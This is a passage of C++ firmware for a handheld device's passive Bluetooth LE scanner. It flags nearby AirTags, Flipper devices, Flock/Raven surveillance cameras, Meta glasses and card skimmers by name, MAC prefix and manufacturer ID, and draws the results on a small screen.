    static const uint8_t kAirTagPat1[] = {0x1E, 0xFF, 0x4C, 0x00};
    static const uint8_t kAirTagPat2[] = {0x4C, 0x00, 0x12, 0x19};
    if (bleHasPayloadPattern(device, kAirTagPat1, sizeof(kAirTagPat1)) ||
        bleHasPayloadPattern(device, kAirTagPat2, sizeof(kAirTagPat2))) {
        flags |= BLE_FLAG_AIRTAG;
        if (hintOut.length() == 0) {
            hintOut = "AirTag";
        }
    }

    bool hasXuntongMfg = false;
    if (device->haveManufacturerData()) {
        const std::string mfgData = device->getManufacturerData();
        if (mfgData.length() >= 2) {
            uint16_t companyId = (uint8_t)mfgData[0] | ((uint16_t)(uint8_t)mfgData[1] << 8);
            primaryIdOut = companyId;
            hasXuntongMfg = (companyId == 0x09C8);
        }
    }
    String flockSerial = hasXuntongMfg ? bleExtractFlockSerial(device) : "";

    if (bleMatchesInfrastructureText(nameLower)) {
        flags |= BLE_FLAG_INFRA;
        if (hintOut.length() == 0) {
            hintOut = "Infra BLE";
        }
    }

    String macLower = device->getAddress().toString().c_str();
    macLower.toLowerCase();
    bool hasFlockMacPrefix = bleMacLooksFlock(macLower);

    bool flockNameMatch = false;
    if (name.startsWith("Penguin-") && name.length() >= 14) {
        // Penguin-XXXXXXXXXX format (Flock camera BLE name)
        flockNameMatch = true;
    } else if (name.equalsIgnoreCase("FS Ext Battery") ||
               name.equalsIgnoreCase("FS Battery") ||
               name.equalsIgnoreCase("Flock Battery")) {
        flockNameMatch = true;
    } else if (bleStringContains(nameLower, "flock") ||
               bleStringContains(nameLower, "penguin") ||
               bleStringContains(nameLower, "pigvision") ||
               bleStringContains(nameLower, "safety camera") ||
               bleStringContains(nameLower, "raven cam") ||
               nameLower.startsWith("fs_") ||
               nameLower.startsWith("fs-")) {
        flockNameMatch = true;
    }

    // OUI match alone is a strong signal — Flock cameras use globally-administered MACs
    // Xuntong manufacturer data is definitive. Name match adds confidence.
    if (hasXuntongMfg || hasFlockMacPrefix) {
        bool confident = hasXuntongMfg ||
                         flockNameMatch ||
                         (hasFlockMacPrefix && name.length() == 0);  // unnamed device with Flock OUI
        if (confident || hasFlockMacPrefix) {
            flags |= BLE_FLAG_FLOCK;
            flags |= BLE_FLAG_INFRA;
            String hint = hasXuntongMfg
                ? bleComposeFlockHint("Flock Battery", flockSerial)
                : (flockNameMatch ? "Flock Camera" : "Flock OUI");
            bleSetPreferredHint(hintOut, hint);
        }
    }

    bool metaBlocked = false;
    if (primaryIdOut != 0) {
        metaBlocked = bleIsBlockedMetaIdentifier(primaryIdOut);
        if (!metaBlocked && bleIsMetaIdentifier(primaryIdOut)) {
            flags |= BLE_FLAG_META;
        }
    }

    if (!metaBlocked && device->haveServiceUUID()) {
        for (uint8_t i = 0; i < device->getServiceUUIDCount(); i++) {
            uint16_t identifier = bleExtractUuid16(device->getServiceUUID(i));
            if (identifier == 0) {
                continue;
            }
            String flockHint;
            if (bleServiceLooksFlock(identifier, flockHint)) {
                flags |= BLE_FLAG_FLOCK;
                flags |= BLE_FLAG_INFRA;
                bleSetPreferredHint(hintOut, flockHint);
                if (primaryIdOut == 0) {
                    primaryIdOut = identifier;
                }
            }
            String infraHint;
            if (bleServiceLooksInfrastructure(identifier, infraHint)) {
                flags |= BLE_FLAG_INFRA;
                bleSetPreferredHint(hintOut, infraHint);
                if (primaryIdOut == 0) {
                    primaryIdOut = identifier;
                }
            }
            if (bleIsBlockedMetaIdentifier(identifier)) {
                metaBlocked = true;
                flags &= ~BLE_FLAG_META;
                break;
            }
            if (bleIsMetaIdentifier(identifier)) {
                flags |= BLE_FLAG_META;
                if (primaryIdOut == 0) {
                    primaryIdOut = identifier;
                }
            }
        }
    }

    if (!metaBlocked && device->haveServiceData()) {
        for (uint8_t i = 0; i < device->getServiceDataCount(); i++) {
            uint16_t identifier = bleExtractUuid16(device->getServiceDataUUID(i));
            if (identifier == 0) {
                continue;
            }
            String flockHint;
            if (bleServiceLooksFlock(identifier, flockHint)) {
                flags |= BLE_FLAG_FLOCK;
                flags |= BLE_FLAG_INFRA;
                bleSetPreferredHint(hintOut, flockHint);
                if (primaryIdOut == 0) {
                    primaryIdOut = identifier;
                }
            }
            String infraHint;
            if (bleServiceLooksInfrastructure(identifier, infraHint)) {
                flags |= BLE_FLAG_INFRA;
                bleSetPreferredHint(hintOut, infraHint);
                if (primaryIdOut == 0) {
                    primaryIdOut = identifier;
                }
            }
            if (bleIsBlockedMetaIdentifier(identifier)) {
                metaBlocked = true;
                flags &= ~BLE_FLAG_META;
                break;
            }
            if (bleIsMetaIdentifier(identifier)) {
                flags |= BLE_FLAG_META;
                if (primaryIdOut == 0) {
                    primaryIdOut = identifier;
                }
            }
        }
    }

    if ((flags & BLE_FLAG_META) != 0 && hintOut.length() == 0) {
        hintOut = "Meta Device";
    }

    if ((flags & BLE_FLAG_FLIPPER) == 0 && bleStringContains(nameLower, "flipper")) {
        flags |= BLE_FLAG_FLIPPER;
        if (hintOut.length() == 0) {
            hintOut = "Flipper";
        }
    }

    // Only flag as AirTag if name explicitly mentions it or "Find My"
    if ((flags & BLE_FLAG_AIRTAG) == 0 &&
        (bleStringContains(nameLower, "airtag") || bleStringContains(nameLower, "find my"))) {
        flags |= BLE_FLAG_AIRTAG;
        if (hintOut.length() == 0) {
            hintOut = "AirTag";
        }
    }

    if ((flags & BLE_FLAG_META) == 0 &&
        (bleStringContains(nameLower, "meta") || bleStringContains(nameLower, "quest") ||
         bleStringContains(nameLower, "oculus") || bleStringContains(nameLower, "ray-ban"))) {
        flags |= BLE_FLAG_META;
        if (hintOut.length() == 0) {
            hintOut = "Meta Device";
        }
    }

    if ((flags & BLE_FLAG_FLOCK) == 0 &&
        (bleStringContains(nameLower, "pigvision") ||
         (hasFlockMacPrefix && bleStringContains(nameLower, "raven")))) {
        flags |= BLE_FLAG_FLOCK;
        flags |= BLE_FLAG_INFRA;
        if (hintOut.length() == 0) {
            hintOut = bleStringContains(nameLower, "raven") ? "Raven BLE" : "Flock BLE";
        }
    }

    if ((flags & BLE_FLAG_INFRA) != 0 && hintOut.length() == 0) {
        hintOut = "Infra BLE";
    }

    return flags;
}

const char* getBluetoothManufacturerLabel() {
    switch (bluetoothManufacturerFilterIndex) {
        case 0:  return "Apple";
        case 1:  return "Android/Google";
        case 2:  return "Samsung";
        case 3:  return "Microsoft";
        case 4:  return "Tile";
        case 5:  return "Ring";
        case 6:  return "Fitbit";
        case 7:  return "Garmin";
        case 8:  return "Sony";
        case 9:  return "Bose";
        case 10: return "Xiaomi";
        case 11: return "Meta";
        case 12: return "Amazon";
        case 13: return "Belkin";
        case 14: return "Infrastructure";
        default: return "Manufacturer";
    }
}

bool bleMatchesManufacturerFilterValues(uint16_t companyId, uint16_t flags, const String& nameLower, const String& hintLower) {
    switch (bluetoothManufacturerFilterIndex) {
        case 0:  return companyId == 0x004C || (flags & BLE_FLAG_AIRTAG) || bleStringContains(nameLower, "apple") || bleStringContains(nameLower, "beats");
        case 1:  return companyId == 0x00E0 || bleStringContains(nameLower, "google") || bleStringContains(nameLower, "android") || bleStringContains(nameLower, "pixel") || bleStringContains(nameLower, "nest");
        case 2:  return companyId == 0x0075 || bleStringContains(nameLower, "samsung") || bleStringContains(nameLower, "galaxy") || bleStringContains(nameLower, "smarttag");
        case 3:  return companyId == 0x0006 || bleStringContains(nameLower, "microsoft") || bleStringContains(nameLower, "xbox") || bleStringContains(nameLower, "surface");
        case 4:  return companyId == 0x013D || bleStringContains(nameLower, "tile");
        case 5:  return bleStringContains(nameLower, "ring") || bleStringContains(hintLower, "ring");
        case 6:  return companyId == 0x00AD || bleStringContains(nameLower, "fitbit");
        case 7:  return companyId == 0x0087 || bleStringContains(nameLower, "garmin");
        case 8:  return companyId == 0x012D || bleStringContains(nameLower, "sony") || bleStringContains(nameLower, "playstation");
        case 9:  return companyId == 0x00F8 || bleStringContains(nameLower, "bose");
        case 10: return bleStringContains(nameLower, "xiaomi") || bleStringContains(nameLower, "redmi") || bleStringContains(nameLower, "mi band");
        case 11: return (flags & BLE_FLAG_META) || bleStringContains(nameLower, "meta") || bleStringContains(nameLower, "quest") || bleStringContains(nameLower, "oculus");
        case 12: return bleStringContains(nameLower, "amazon") || bleStringContains(nameLower, "echo") || bleStringContains(nameLower, "alexa") || bleStringContains(nameLower, "fire");
        case 13: return bleStringContains(nameLower, "belkin") || bleStringContains(nameLower, "wemo");
        case 14: return (flags & BLE_FLAG_INFRA) || bleMatchesInfrastructureText(nameLower) || bleMatchesInfrastructureText(hintLower);
        default: return true;
    }
}

bool bleMatchesManufacturerFilter(int index) {
    if (index < 0 || index >= bleDeviceCount) {
        return false;
    }

    String nameLower = String(bleNames[index]);
    nameLower.toLowerCase();
    String hintLower = String(bleHints[index]);
    hintLower.toLowerCase();
    return bleMatchesManufacturerFilterValues(bleCompanyIds[index], bleDetectFlags[index], nameLower, hintLower);
}

int bleComputeFlockScore(uint16_t flags, uint16_t companyId, const String& nameLower,
                         const String& hintLower, int rssi) {
    int score = 0;

    if ((flags & BLE_FLAG_FLOCK) != 0) score += 4;
    if ((flags & BLE_FLAG_INFRA) != 0) score += 1;
    if (companyId == 0x09C8) score += 4;

    if (bleStringContains(nameLower, "flock") || bleStringContains(hintLower, "flock")) score += 3;
    if (bleStringContains(nameLower, "penguin") || bleStringContains(hintLower, "penguin")) score += 3;
    if (bleStringContains(nameLower, "pigvision") || bleStringContains(hintLower, "pigvision")) score += 3;
    if (bleStringContains(nameLower, "raven") || bleStringContains(hintLower, "raven")) score += 4;
    if (bleStringContains(nameLower, "battery") || bleStringContains(hintLower, "battery")) score += 3;
    if (bleHasSerialToken(nameLower) || bleHasSerialToken(hintLower)) score += 4;

    if ((companyId == 0x09C8 || (flags & BLE_FLAG_FLOCK) != 0) && nameLower.length() == 0) {
        score += 1;
    }

    if (rssi >= -82) score += 1;
    if (rssi >= -72) score += 1;
    if (rssi >= -62) score += 1;

    return score;
}

bool bleMatchesBluetoothSnifferProfileValues(uint16_t flags, uint16_t companyId, const String& nameLower, const String& hintLower) {
    if (bluetoothSnifferProfile == BT_SNIFFER_ANALYZER ||
        bluetoothSnifferProfile == BT_SNIFFER_GENERAL) {
        return true;
    }

    if (bluetoothSnifferProfile == BT_SNIFFER_MANUFACTURER) {
        return bleMatchesManufacturerFilterValues(companyId, flags, nameLower, hintLower);
    }

    bool isAnonymous = (companyId == 0 && nameLower.length() == 0);

    if (bluetoothSnifferProfile == BT_SNIFFER_CARD_SKIMMERS) {
        return (flags & BLE_FLAG_SKIMMER) != 0;
    }

    if (bluetoothSnifferProfile == BT_SNIFFER_FLIPPER) {
        return (flags & BLE_FLAG_FLIPPER) != 0 || isAnonymous;
    }

    if (bluetoothSnifferProfile == BT_SNIFFER_AIRTAG) {
        return (flags & BLE_FLAG_AIRTAG) != 0;
    }

    if (bluetoothSnifferProfile == BT_SNIFFER_FLOCK) {
        return bleComputeFlockScore(flags, companyId, nameLower, hintLower, -75) >= 4;
    }

    if (bluetoothSnifferProfile == BT_SNIFFER_META) {
        return (flags & BLE_FLAG_META) != 0 || isAnonymous;
    }

    return true;
}

bool bleMatchesBluetoothSnifferProfile(int index) {
    if (index < 0 || index >= bleDeviceCount) {
        return false;
    }

    String nameLower = String(bleNames[index]);
    nameLower.toLowerCase();
    String hintLower = String(bleHints[index]);
    hintLower.toLowerCase();
    return bleMatchesBluetoothSnifferProfileValues(bleDetectFlags[index], bleCompanyIds[index], nameLower, hintLower);
}

void drawBLEListView(const char* title, int highlightIndex = -1, const char* actionLabel = "Rescan",
                     const char* subtitle = "Nearby devices",
                     const char* selectHint = "UP/DN move  SEL open") {
    int visibleItems = 5;
    int filteredIndexes[MAX_SCAN_RESULTS];
    bool useSnifferProfile = (currentRadioMode == BLE_SCAN);
    const int rowX = 8;
    const int rowW = 212;
    const int rowH = 28;
    const int rowStep = 34;
    const int firstRowY = 80;
    uint16_t bg = ILI9341_BLACK;
    uint16_t accent = tft.color565(242, 242, 242);
    uint16_t textSoft = tft.color565(160, 160, 160);
    uint16_t rowFill = tft.color565(18, 18, 18);
    uint16_t rowSelected = tft.color565(34, 34, 34);

    int deviceCountForView = bleDeviceCount;
    if (useSnifferProfile) {
        deviceCountForView = 0;
        for (int i = 0; i < bleDeviceCount && deviceCountForView < MAX_SCAN_RESULTS; i++) {
            if (!bleMatchesBluetoothSnifferProfile(i)) {
                continue;
            }
            filteredIndexes[deviceCountForView++] = i;
        }
    }

    int totalItems = deviceCountForView + 1;
    if (bleSelectedIndex >= totalItems) {
        bleSelectedIndex = max(0, totalItems - 1);
    }
    if (bleSelectedIndex < 0) {
        bleSelectedIndex = 0;
    }

    if (bleSelectedIndex < bleScrollOffset)
        bleScrollOffset = bleSelectedIndex;

    if (bleSelectedIndex >= bleScrollOffset + visibleItems)
        bleScrollOffset = bleSelectedIndex - visibleItems + 1;

    tft.fillRect(0, 20, 240, 300, bg);
    tft.drawFastHLine(10, 68, 220, tft.color565(52, 52, 52));

    tft.setTextSize(2);
    tft.setCursor(18, 40);
    tft.setTextColor(ILI9341_WHITE);
    tft.print(title);

    tft.setTextSize(1);
    tft.setTextColor(textSoft);
    tft.setCursor(18, 58);
    tft.print(subtitle);

    drawCountBadge(186, 38, deviceCountForView);

    drawListScrollArrows(totalItems, visibleItems, bleScrollOffset);

    for (int i = 0; i < visibleItems; i++) {
        int index = i + bleScrollOffset;
        if (index >= totalItems) break;

        int y = firstRowY + (i * rowStep);
        bool selected = (index == bleSelectedIndex);
        bool highlighted = (highlightIndex >= 0 && index == highlightIndex);

        tft.fillRoundRect(rowX, y - 5, rowW, rowH, 5, selected ? rowSelected : rowFill);
        drawListSelectionFrame(rowX, y - 5, rowW, rowH, selected, accent);

        tft.setCursor(24, y + 4);
        tft.setTextSize(1);

        if (index == deviceCountForView) {
            tft.setTextColor(accent);
            tft.print(actionLabel);
            continue;
        }

        int actualIndex = useSnifferProfile ? filteredIndexes[index] : index;
        const char* sourceText = bleHints[actualIndex][0]
            ? bleHints[actualIndex]
            : (isGenericBLEName(bleNames[actualIndex]) ? bleMACs[actualIndex] : bleNames[actualIndex]);
        char name[17];
        strncpy(name, sourceText, 16); name[16] = 0;
        highlighted = (highlightIndex >= 0 && actualIndex == highlightIndex);

        if (highlighted) {
            tft.fillCircle(24, y + 9, 3, accent);
            tft.setCursor(32, y + 4);
        }

        tft.setTextColor(highlighted ? accent : ILI9341_WHITE);
        tft.print(name);

        tft.setTextColor(textSoft);
        tft.setCursor(146, y + 4);
        tft.print(bleRSSI[actualIndex]);

        int bars = map(bleRSSI[actualIndex], -100, -30, 1, 5);
        bars = constrain(bars, 1, 5);

        int baseY = y + 16;
        for (int b = 0; b < 5; b++) {
            int h = 2 + (b * 3);
            uint16_t color = (b < bars) ? accent : tft.color565(70, 70, 70);
            tft.fillRect(184 + b * 5, baseY - h, 4, h, color);
        }
    }

    tft.setTextSize(1);
    tft.setTextColor(textSoft);
    tft.setCursor(12, 258);
    tft.print("Hint");
    tft.setCursor(52, 258);
    tft.print(selectHint);
    tft.setCursor(12, 274);
    tft.print("Back");
    tft.setCursor(52, 274);
    tft.print("LEFT");
}

void resetBLEAnalyzerHistory() {
    for (int i = 0; i < BLE_ANALYZER_POINTS; i++) {
        bleAnalyzerSamples[i] = 0;
    }
    bleAnalyzerWriteIndex = 0;
    bleAnalyzerSampleCount = 0;
    bleLastObservedCount = -1;
    bleAnalyzerNextScanMs = 0;
    bleAnalyzerLastDrawMs = 0;
    bleAnalyzerHeaderDrawn = false; // Reset header flag
}

void pushBLEAnalyzerSample(int sampleCount) {
    if (sampleCount < 0) {
        return;
    }
    bleAnalyzerSamples[bleAnalyzerWriteIndex] = sampleCount;
    bleAnalyzerWriteIndex = (bleAnalyzerWriteIndex + 1) % BLE_ANALYZER_POINTS;
    if (bleAnalyzerSampleCount < BLE_ANALYZER_POINTS) {
        bleAnalyzerSampleCount++;
    }
}

void drawBLEAnalyzer() {
    // Throttle redraws to reduce flickering - only redraw every 500ms unless forced
    if (!bleNeedsRedraw && millis() - bleAnalyzerLastDrawMs < 500UL) {
        return;
    }

    bleNeedsRedraw = false;
    bleAnalyzerLastDrawMs = millis();

    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t cyan = tft.color565(80, 240, 255);
    const uint16_t green = tft.color565(60, 220, 110);
    const uint16_t orange = tft.color565(255, 170, 60);
    const int graphX = 16;
    const int graphY = 98;
    const int graphW = 208;
    const int graphH = 118;

    // Draw static header only once
    if (!bleAnalyzerHeaderDrawn) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(10, 68, 220, tft.color565(52, 52, 52));

        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 40);
        tft.print("BT Analyzer");

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("BLE beacon density history");
        
        bleAnalyzerHeaderDrawn = true;
    }

    // Only clear the dynamic areas, not the entire screen
    tft.fillRect(16, 74, 208, 142, bg); // Clear stats and graph area only

    // Draw stats boxes
    tft.fillRoundRect(16, 74, 64, 20, 4, tft.color565(22, 22, 22));
    tft.fillRoundRect(88, 74, 64, 20, 4, tft.color565(22, 22, 22));
    tft.fillRoundRect(160, 74, 64, 20, 4, tft.color565(22, 22, 22));

    int peak = 0;
    int sum = 0;
    for (int i = 0; i < bleAnalyzerSampleCount; i++) {
        int idx = (bleAnalyzerWriteIndex - bleAnalyzerSampleCount + i + BLE_ANALYZER_POINTS) % BLE_ANALYZER_POINTS;
        int sample = bleAnalyzerSamples[idx];
        if (sample > peak) peak = sample;
        sum += sample;
    }
    int average = bleAnalyzerSampleCount > 0 ? (sum / bleAnalyzerSampleCount) : 0;
    int latest = (bleAnalyzerSampleCount > 0)
        ? bleAnalyzerSamples[(bleAnalyzerWriteIndex - 1 + BLE_ANALYZER_POINTS) % BLE_ANALYZER_POINTS]
        : 0;

    tft.setTextSize(1);
    tft.setTextColor(cyan);
    tft.setCursor(22, 80);
    tft.print("Now ");
    tft.print(latest);

    tft.setTextColor(green);
    tft.setCursor(94, 80);
    tft.print("Max ");
    tft.print(peak);

    tft.setTextColor(orange);
    tft.setCursor(166, 80);
    tft.print("Avg ");
    tft.print(average);

    tft.drawRect(graphX, graphY, graphW, graphH, tft.color565(60, 60, 60));

    int scaleMax = max(peak, 4);
    if (bleAnalyzerSampleCount > 0) {
        for (int i = 0; i < bleAnalyzerSampleCount; i++) {
            int idx = (bleAnalyzerWriteIndex - bleAnalyzerSampleCount + i + BLE_ANALYZER_POINTS) % BLE_ANALYZER_POINTS;
            int sample = bleAnalyzerSamples[idx];
            int barH = map(sample, 0, scaleMax, 0, graphH - 6);
            barH = constrain(barH, 0, graphH - 6);
            int x = graphX + 4 + i * 4;
            tft.drawFastVLine(x, graphY + graphH - 3 - barH, barH, cyan);
        }

        int maxLineY = graphY + graphH - 4 - map(peak, 0, scaleMax, 0, graphH - 6);
        int avgLineY = graphY + graphH - 4 - map(average, 0, scaleMax, 0, graphH - 6);
        tft.drawFastHLine(graphX + 1, maxLineY, graphW - 2, green);
        tft.drawFastHLine(graphX + 1, avgLineY, graphW - 2, orange);
    } else {
        tft.setTextColor(textSoft);
        tft.setCursor(62, 148);
        tft.print("Waiting for BLE traffic");
    }

    // Only update status text area
    tft.fillRect(12, 238, 216, 48, bg);
    tft.setTextColor(textSoft);
    tft.setCursor(12, 238);
    tft.print(bleScanRunning ? "Sampling..." : "Tracking nearby BLE frames");
    tft.setCursor(12, 258);
    tft.print("SEL exit");
    tft.setCursor(12, 274);
    tft.print("LEFT back");
}

void runBLEScanner() {
    const unsigned long now = millis();

    if (bluetoothSnifferProfile == BT_SNIFFER_FLOCK) {
        serviceFlockWiFiSniffer();
        drainFlockWiFiAlerts();
    }

    int beforePruneCount = bleDeviceCount;
    pruneBLEScanResults(12000UL);
    if (bleDeviceCount != beforePruneCount) {
        bleNeedsRedraw = true;
    }

    auto scannerTitle = [&]() -> const char* {
        switch (bluetoothSnifferProfile) {
            case BT_SNIFFER_GENERAL: return "Bluetooth Sniffer";
            case BT_SNIFFER_CARD_SKIMMERS: return "Detect Card Skimmers";
            case BT_SNIFFER_FLIPPER: return "Flipper Sniff";
            case BT_SNIFFER_AIRTAG: return "AirTag Sniff";
            case BT_SNIFFER_FLOCK: return "Flock Sniff";
            case BT_SNIFFER_META: return "Meta Detect";
            case BT_SNIFFER_MANUFACTURER: return "Manufacturer";
            case BT_SNIFFER_ANALYZER:
            default: return "BT Analyzer";
        }
    };

    auto scannerSubtitle = [&]() -> const char* {
        switch (bluetoothSnifferProfile) {
            case BT_SNIFFER_CARD_SKIMMERS: return "HC-03 / HC-05 / HC-06 style hits";
            case BT_SNIFFER_FLIPPER: return "UUID-tagged Flipper beacons";
            case BT_SNIFFER_AIRTAG: return "Apple Find My advertisements";
            case BT_SNIFFER_FLOCK: return "BLE + WiFi Flock / Raven detect";
            case BT_SNIFFER_META: return "Meta / Quest / Ray-Ban adverts";
            case BT_SNIFFER_MANUFACTURER: return getBluetoothManufacturerLabel();
            case BT_SNIFFER_GENERAL: return "Nearby BLE devices";
            case BT_SNIFFER_ANALYZER:
            default: return "Inspect nearby BLE activity";
        }
    };

    auto startQueuedScan = [&]() {
        if (radioModeTransitionActive()) {
            setBLEScanStatus("Switching radio");
            bleNeedsRedraw = true;
            return;
        }
        bleScanRunning = true;
        bleScanStartedAt = millis();
        bleScanReadyAt = millis() + 420UL;
        bleScanAutoRetryPending = true;
        bleScanWarmupRetries = 1;
        bleScanTaskHandle = NULL;
        setBLEScanStatus("Queueing scan");
        bleNeedsRedraw = true;
        bleScannerFirstDraw = true;
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
    };

    unsigned long &lastAnim = lastScanAnim;
    uint8_t &dots = scanDots;
    bool &firstDraw = bleScannerFirstDraw;

    if (bleScanRunning && bleScanStartedAt != 0 && now - bleScanStartedAt > 20000UL) {
        LOG("BLE scan timeout reset");
        bleScanRunning = false;
        bleScanStartedAt = 0;
        bleScanReadyAt = 0;
        bleScanWarmupRetries = 0;
        bleScanTaskHandle = NULL;
        radioLocked = false;
        setBLEScanStatus("Scan timeout", true);
        bleNeedsRedraw = true;
        bleAnalyzerNextScanMs = 0;
    }

    if (bluetoothSnifferProfile == BT_SNIFFER_ANALYZER) {
        if (bleScanRunning) {
            drawBLEAnalyzer();
            return;
        }

        if (bleAnalyzerNextScanMs != 0 && now >= bleAnalyzerNextScanMs) {
            bleAnalyzerNextScanMs = 0;
            startQueuedScan();
            return;
        }

        drawBLEAnalyzer();
        return;
    }

    if (!bleScanRunning && bleContinuousScanAt != 0 && now >= bleContinuousScanAt) {
        bleContinuousScanAt = 0;
        startQueuedScan();
    }

    // Show results immediately - no scanning screen

    if (!bleNeedsRedraw) return;
    bleNeedsRedraw = false;

    // Filter devices based on profile
    int filteredIndexes[MAX_SCAN_RESULTS];
    int filteredCount = 0;
    for (int i = 0; i < bleDeviceCount && filteredCount < MAX_SCAN_RESULTS; i++) {
        if (!bleMatchesBluetoothSnifferProfile(i)) {
            continue;
        }
        filteredIndexes[filteredCount++] = i;
    }

    int visibleItems = 5;
    int totalItems = filteredCount + 1;  // +1 for rescan
    const uint16_t bg = ILI9341_BLACK;
    
    // Different colors for different scanner types
    uint16_t accent;
    switch (bluetoothSnifferProfile) {
        case BT_SNIFFER_FLIPPER:
            accent = tft.color565(255, 100, 50);  // Orange for Flipper
            break;
        case BT_SNIFFER_AIRTAG:
            accent = tft.color565(100, 200, 255);  // Blue for AirTag
            break;
        case BT_SNIFFER_CARD_SKIMMERS:
            accent = tft.color565(255, 50, 50);  // Red for card skimmers
            break;
        case BT_SNIFFER_FLOCK:
            accent = tft.color565(100, 255, 150);  // Green for Flock
            break;
        case BT_SNIFFER_META:
            accent = tft.color565(0, 150, 255);  // Meta blue
            break;
        case BT_SNIFFER_MANUFACTURER:
            accent = tft.color565(255, 200, 50);  // Yellow for manufacturer
            break;
        case BT_SNIFFER_GENERAL:
        default:
            accent = tft.color565(150, 100, 255);  // Purple for general BLE
            break;
    }
    
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t rowFill = tft.color565(18, 18, 18);
    const uint16_t rowSelected = tft.color565(34, 34, 34);

    // Scroll logic
    if (bleSelectedIndex < bleScrollOffset)
        bleScrollOffset = bleSelectedIndex;
    if (bleSelectedIndex >= bleScrollOffset + visibleItems)
        bleScrollOffset = bleSelectedIndex - visibleItems + 1;

    // Smart redraw - only full clear on first draw or scroll change
    static int lastScrollOffset = -1;
    static int lastFilteredCount = -1;
    bool fullRedraw = bleScannerFirstDraw || (lastScrollOffset != bleScrollOffset) || (lastFilteredCount != filteredCount);
    lastScrollOffset = bleScrollOffset;
    lastFilteredCount = filteredCount;
    bleScannerFirstDraw = false;

    if (fullRedraw) {
        // Clear screen
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));

        // Title
        tft.setTextSize(2);
        tft.setTextColor(accent);
        tft.setCursor(18, 40);
        tft.print(scannerTitle());

        // Subtitle
        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print(scannerSubtitle());

        // Instructions
        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(12, 278);
        tft.print("UP/DN scroll  RIGHT sort  LEFT back");
    }

    drawToastIfActive();

    // Count badge — show filtered/total and sort mode
    tft.fillRoundRect(140, 34, 86, 16, 4, tft.color565(40, 40, 40));
    tft.setTextColor(accent);
    tft.setCursor(144, 38);
    tft.print(filteredCount);
    if (filteredCount != bleDeviceCount) {
        tft.setTextColor(textSoft);
        tft.print("/");
        tft.print(bleDeviceCount);
    }
    // Sort mode indicator
    tft.setTextColor(tft.color565(80, 80, 80));
    tft.setCursor(196, 38);
    tft.print(bleSortMode == 1 ? "NEW" : "SIG");

    // Show scan / filter / failure state if empty
    if (filteredCount == 0) {
        // Clear the status area before drawing to prevent text overlap
        tft.fillRect(0, 110, 240, 50, bg);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 120);
        if (bleScanRunning) {
            tft.print("Scanning...");
        } else if (bleDeviceCount > 0) {
            tft.print("No matches for filter");
        } else if (bleScanLastRunFailed) {
            tft.print("BLE scan needs attention");
        } else {
            tft.print("Listening...");
        }
        tft.setCursor(18, 136);
        tft.print(bleScanStatus);
        return;
    }

    // Draw list items
    const unsigned long nowMs = millis();
    for (int i = 0; i < visibleItems; i++) {
        int index = i + bleScrollOffset;
        if (index >= totalItems) {
            tft.fillRect(8, 78 + i * 38, 224, 34, bg);
            continue;
        }

        int y = 78 + i * 38;
        bool selected = (index == bleSelectedIndex);

        tft.fillRoundRect(8, y, 224, 32, 4, selected ? rowSelected : rowFill);
        drawListSelectionFrame(8, y, 224, 32, selected, accent);

        tft.setTextSize(1);

        if (index == filteredCount) {
            tft.setTextColor(accent);
            tft.setCursor(14, y + 12);
            tft.print("Rescan");
            continue;
        }

        int deviceIndex = filteredIndexes[index];
        uint16_t detectFlags = bleDetectFlags[deviceIndex];

        // Name (top line) — prefer hint over generic MAC name
        const char* displayName = bleNames[deviceIndex];
        if (isGenericBLEName(displayName) && bleHints[deviceIndex][0]) {
            displayName = bleHints[deviceIndex];
        }
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(14, y + 4);
        // Clear text area first to prevent garbled text
        tft.fillRect(14, y + 4, 150, 8, selected ? rowSelected : rowFill);
        char nameDisp[16]; strncpy(nameDisp, displayName, 15); nameDisp[15] = 0;
        tft.print(nameDisp);

        // RSSI (top right)
        tft.setTextColor(textSoft);
        tft.setCursor(170, y + 4);
        // Clear text area first
        tft.fillRect(170, y + 4, 50, 8, selected ? rowSelected : rowFill);
        tft.print(bleRSSI[deviceIndex]);
        tft.print("dB");

        // Bottom line: hint/MAC + last-seen age
        tft.setTextColor(textSoft);
        tft.setCursor(14, y + 16);
        // Clear text area first
        tft.fillRect(14, y + 16, 150, 8, selected ? rowSelected : rowFill);
        if (bleHints[deviceIndex][0] && strcmp(displayName, bleHints[deviceIndex]) != 0) {
            char hintDisp[12]; strncpy(hintDisp, bleHints[deviceIndex], 11); hintDisp[11] = 0;
            tft.print(hintDisp);
        } else {
            // Show last 5 chars of MAC as identifier
            const char* mac = bleMACs[deviceIndex];
            int mlen = strlen(mac);
            if (mlen >= 5) tft.print(mac + mlen - 5);
        }

        // Last-seen age (bottom right)
        if (bleLastSeen[deviceIndex] > 0) {
            unsigned long ageSec = (nowMs - bleLastSeen[deviceIndex]) / 1000UL;
            tft.setCursor(168, y + 16);
            // Clear text area first
            tft.fillRect(168, y + 16, 50, 8, selected ? rowSelected : rowFill);
            if (ageSec < 60) {
                tft.print(ageSec); tft.print("s");
            } else {
                tft.print(ageSec / 60); tft.print("m");
            }
        }

        // Flag badges (small colored dots, right side of top line)
        int badgeX = 160;
        auto drawBadge = [&](uint16_t color) {
            tft.fillRect(badgeX, y + 3, 5, 5, color);
            badgeX -= 7;
        };
        if (detectFlags & BLE_FLAG_AIRTAG)  drawBadge(tft.color565(100, 200, 255));  // blue
        if (detectFlags & BLE_FLAG_FLIPPER) drawBadge(tft.color565(255, 120, 40));   // orange
        if (detectFlags & BLE_FLAG_FLOCK)   drawBadge(tft.color565(80, 255, 120));   // green
        if (detectFlags & BLE_FLAG_META)    drawBadge(tft.color565(60, 120, 255));   // meta blue
        if (detectFlags & BLE_FLAG_SKIMMER) drawBadge(tft.color565(255, 50, 50));    // red
        if (detectFlags & BLE_FLAG_INFRA)   drawBadge(tft.color565(200, 200, 60));   // yellow
    }
}  // end runBLEScanner

